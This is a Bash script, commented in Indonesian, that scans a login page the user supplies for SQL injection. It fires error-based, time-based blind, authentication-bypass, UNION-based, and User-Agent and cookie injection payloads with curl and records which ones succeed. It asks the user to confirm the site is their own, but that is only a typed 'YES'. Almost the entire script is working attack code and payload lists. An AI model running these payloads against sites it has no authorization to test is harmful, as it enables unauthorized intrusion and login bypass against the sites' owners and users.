#!/bin/bash
# ============================================
#   🥷 SQLi TESTER v4.0 — FIXED & SAFE
#   Hanya untuk web sendiri!
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; NC='\033[0m'

[[ $EUID -ne 0 ]] && { echo -e "${RED}❌ Harus root!${NC}"; exit 1; }

clear
echo -e "${MAGENTA}╔════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║  🥷 SQLi TESTER v4.0 — FIXED EDITION       ║${NC}"
echo -e "${MAGENTA}║  (Hanya untuk web milik sendiri)           ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════╝${NC}"
echo ""

read -p "👉 Masukkan URL Web KAMU SENDIRI (contoh: https://gold.domainmu.com/login.php): " TARGET_URL
[[ -z "$TARGET_URL" ]] && { echo -e "${RED}❌ URL Kosong!${NC}"; exit 1; }

# Peringatan keras
echo ""
echo -e "${RED}⚠️  PERINGATAN: Pastikan ini domain milik kamu!${NC}"
read -p "Apakah ini domain milikmu? (ketik 'YES'): " CONFIRM
[[ "$CONFIRM" != "YES" ]] && { echo "Dibatalkan."; exit 0; }

if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    echo -e "${RED}❌ URL harus diawali http:// atau https://${NC}"; exit 1
fi

RESULT_DIR="/root/sqli-results"
mkdir -p "$RESULT_DIR"
RESULT_FILE="$RESULT_DIR/scan_$(date +%Y%m%d_%H%M%S).txt"

echo -e "\n${CYAN}[1/6] Cek Target...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET_URL")
if [[ "$HTTP_CODE" != "200" ]]; then
    echo -e "${RED}❌ Target mati (HTTP $HTTP_CODE)${NC}"; exit 1
fi
echo -e "${GREEN}  ✓ Target Hidup (HTTP 200)${NC}"

VULN=0
TOTAL_TESTS=0
START_TIME=$(date +%s)

# Hapus keyword 'local' agar tidak error
run_test() {
    LABEL="$1"
    PAYLOAD="$2"
    METHOD="$3"
    
    TOTAL_TESTS=$((TOTAL_TESTS+1))
    ENCODED=$(printf %s "$PAYLOAD" | jq -sRr @uri)
    
    if [[ "$METHOD" == "POST" ]]; then
        RESP=$(curl -s -L -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=${ENCODED}&password=test" \
            "$TARGET_URL" 2>&1)
    else
        RESP=$(curl -s -L "$TARGET_URL?username=${ENCODED}&password=test" 2>&1)
    fi
    
    if echo "$RESP" | grep -qiE "sql syntax|mysql_fetch|mysqli_|PDOException|syntax error|unclosed quotation|Warning.*mysql|XPATH syntax|UPDATEXML|EXTRACTVALUE"; then
        echo -e "${RED}  🚨 [VULNERABLE] $LABEL | Payload: $PAYLOAD${NC}"
        echo "VULNERABLE: $LABEL | Payload: $PAYLOAD" >> "$RESULT_FILE"
        VULN=$((VULN+1))
        return 1
    fi
    echo -e "${GREEN}  ✓ [SAFE] $LABEL${NC}"
    return 0
}

# TEST 1: ERROR-BASED
echo -e "\n${CYAN}[2/6] TEST 1: Error-Based SQL Injection...${NC}"
PAYLOADS_ERR=(
    "admin'"
    "admin''"
    "\""
    "\\"
    "admin' AND 1=CONVERT(int, (SELECT @@version))--"
    "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--"
    "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--"
)
for P in "${PAYLOADS_ERR[@]}"; do
    run_test "Error-Based" "$P" "POST"
done

# TEST 2: TIME-BASED
echo -e "\n${CYAN}[3/6] TEST 2: Time-Based Blind SQLi...${NC}"
PAYLOADS_TIME=(
    "admin' OR SLEEP(3)--"
    "admin' AND SLEEP(3)--"
    "admin' OR (SELECT 1 FROM (SELECT SLEEP(3))a)--"
    "admin' OR BENCHMARK(10000000, MD5('test'))--"
)
for P in "${PAYLOADS_TIME[@]}"; do
    TOTAL_TESTS=$((TOTAL_TESTS+1))
    ENCODED=$(printf %s "$P" | jq -sRr @uri)
    
    START_TS=$(date +%s)
    curl -s -L -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${ENCODED}&password=test" \
        "$TARGET_URL" > /dev/null 2>&1
    END_TS=$(date +%s)
    DURATION=$((END_TS - START_TS))
    
    if [[ $DURATION -ge 3 ]]; then
        echo -e "${RED}  🚨 [VULNERABLE] Time-Based | Payload: $P | Delay: ${DURATION}s${NC}"
        echo "VULNERABLE: Time-Based | Payload: $P | Delay: ${DURATION}s" >> "$RESULT_FILE"
        VULN=$((VULN+1))
    else
        echo -e "${GREEN}  ✓ [SAFE] Time-Based | Respon ${DURATION}s${NC}"
    fi
done

# TEST 3: AUTH BYPASS
echo -e "\n${CYAN}[4/6] TEST 3: Auth Bypass...${NC}"
PAYLOADS_AUTH=(
    "admin' --"
    "admin'#"
    "' OR '1'='1"
    "' OR 1=1--"
    "') OR ('1'='1"
)
for P in "${PAYLOADS_AUTH[@]}"; do
    TOTAL_TESTS=$((TOTAL_TESTS+1))
    ENCODED=$(printf %s "$P" | jq -sRr @uri)
    
    RESP=$(curl -s -L -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${ENCODED}&password=anypassword" \
        "$TARGET_URL" 2>&1)
    
    if echo "$RESP" | grep -qiE "logout|dashboard|welcome|profil" && \
       ! echo "$RESP" | grep -qiE "salah|error|invalid|gagal|ditolak"; then
        echo -e "${RED}  🚨 [VULNERABLE] Auth Bypass | Payload: $P${NC}"
        echo "VULNERABLE: Auth Bypass | Payload: $P" >> "$RESULT_FILE"
        VULN=$((VULN+1))
    else
        echo -e "${GREEN}  ✓ [SAFE] Auth Bypass | $P${NC}"
    fi
done

# TEST 4: UNION-BASED
echo -e "\n${CYAN}[5/6] TEST 4: Union-Based...${NC}"
PAYLOADS_UNION=(
    "admin' UNION SELECT NULL--"
    "admin' UNION SELECT NULL,NULL--"
    "admin' UNION SELECT NULL,NULL,NULL--"
    "admin' UNION SELECT 1,2,3,4,5--"
)
for P in "${PAYLOADS_UNION[@]}"; do
    run_test "Union-Based" "$P" "POST"
done

# TEST 5: HEADERS
echo -e "\n${CYAN}[6/6] TEST 5: Header & Cookie...${NC}"

TOTAL_TESTS=$((TOTAL_TESTS+1))
START_UA=$(date +%s)
curl -s -L -A "admin' OR SLEEP(3)--" "$TARGET_URL" > /dev/null 2>&1
END_UA=$(date +%s)
if [[ $((END_UA - START_UA)) -ge 3 ]]; then
    echo -e "${RED}  🚨 [VULNERABLE] User-Agent Injection${NC}"
    echo "VULNERABLE: User-Agent" >> "$RESULT_FILE"
    VULN=$((VULN+1))
else
    echo -e "${GREEN}  ✓ [SAFE] User-Agent${NC}"
fi

TOTAL_TESTS=$((TOTAL_TESTS+1))
START_COOKIE=$(date +%s)
curl -s -L -b "session=admin' OR SLEEP(3)--" "$TARGET_URL" > /dev/null 2>&1
END_COOKIE=$(date +%s)
if [[ $((END_COOKIE - START_COOKIE)) -ge 3 ]]; then
    echo -e "${RED}  🚨 [VULNERABLE] Cookie Injection${NC}"
    echo "VULNERABLE: Cookie" >> "$RESULT_FILE"
    VULN=$((VULN+1))
else
    echo -e "${GREEN}  ✓ [SAFE] Cookie${NC}"
fi

# HASIL AKHIR
END_TIME=$(date +%s)
DURATION_TOTAL=$((END_TIME - START_TIME))

echo -e "\n${CYAN}╔════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║         HASIL PEMINDAIAN (SCAN)            ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════╝${NC}"
echo -e "  🎯 Target       : $TARGET_URL"
echo -e "  📊 Total Test   : $TOTAL_TESTS"
echo -e "  ⏱️  Waktu Scan   : ${DURATION_TOTAL} detik"
echo -e "  🚨 Celah Ditemukan: $VULN"
echo ""

if [[ $VULN -eq 0 ]]; then
    echo -e "${GREEN}╔════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║  🛡️  WEB KEBAL DARI SQL INJECTION!         ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
else
    echo -e "${RED}╔════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  🚨 WEB RENTAN! Ada $VULN celah.           ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════╝${NC}"
fi
echo ""
echo -e "${CYAN}📁 Detail:${NC} $RESULT_FILE"
